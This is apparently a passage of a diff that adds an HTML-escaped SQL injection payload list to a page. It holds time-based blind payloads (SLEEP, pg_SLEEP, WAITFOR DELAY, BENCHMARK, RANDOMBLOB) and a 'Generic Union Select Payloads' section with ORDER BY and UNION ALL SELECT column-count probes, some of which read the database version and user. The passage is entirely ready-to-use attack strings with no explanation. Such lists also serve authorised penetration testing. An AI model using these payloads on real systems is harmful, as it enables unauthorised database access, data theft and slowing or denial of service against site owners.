+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND &#39;%&#39;=&#39;
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)=&amp;quot;
+SLEEP(5)=&#39;
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)=&amp;quot;
+or SLEEP(5)=&#39;
+waitfor delay &#39;00:00:05&#39;
+waitfor delay &#39;00:00:05&#39;--
+waitfor delay &#39;00:00:05&#39;#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+&#39;\&amp;quot;
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&amp;amp;&amp;amp;SLEEP(5)
+&amp;amp;&amp;amp;SLEEP(5)--
+&amp;amp;&amp;amp;SLEEP(5)#
+&#39; AnD SLEEP(5) ANd &#39;1
+&#39;&amp;amp;&amp;amp;SLEEP(5)&amp;amp;&amp;amp;&#39;1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+&#39;
++ SLEEP(10) + &#39;
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*&#39; or SLEEP(1) or &#39;&amp;quot; or SLEEP(1) or &amp;quot;*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;generic-union-select-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-union-select-payloads&#34;&gt;#&lt;/a&gt; Generic Union Select Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt; ORDER BY SLEEP(5)
+ ORDER BY 1,SLEEP(5)
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ ORDER BY SLEEP(5)#
+ ORDER BY 1,SLEEP(5)#
+ ORDER BY 1,SLEEP(5),3#
+ ORDER BY 1,SLEEP(5),3,4#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ ORDER BY SLEEP(5)-- 
+ ORDER BY 1,SLEEP(5)-- 
+ ORDER BY 1,SLEEP(5),3-- 
+ ORDER BY 1,SLEEP(5),3,4-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT 1
+ UNION ALL SELECT 1,2
+ UNION ALL SELECT 1,2,3
+ UNION ALL SELECT 1,2,3,4
+ UNION ALL SELECT 1,2,3,4,5
+ UNION ALL SELECT 1,2,3,4,5,6
+ UNION ALL SELECT 1,2,3,4,5,6,7
+ UNION ALL SELECT 1,2,3,4,5,6,7,8
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT 1#
+ UNION ALL SELECT 1,2#
+ UNION ALL SELECT 1,2,3#
+ UNION ALL SELECT 1,2,3,4#
+ UNION ALL SELECT 1,2,3,4,5#
+ UNION ALL SELECT 1,2,3,4,5,6#
+ UNION ALL SELECT 1,2,3,4,5,6,7#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT 1-- 
+ UNION ALL SELECT 1,2-- 
+ UNION ALL SELECT 1,2,3-- 
+ UNION ALL SELECT 1,2,3,4-- 
+ UNION ALL SELECT 1,2,3,4,5-- 
+ UNION ALL SELECT 1,2,3,4,5,6-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION SELECT @@VERSION,SLEEP(5),3
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION SELECT @@VERSION,SLEEP(5),&amp;quot;&#39;3
+ UNION SELECT @@VERSION,SLEEP(5),&amp;quot;&#39;3&#39;&amp;quot;#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15#
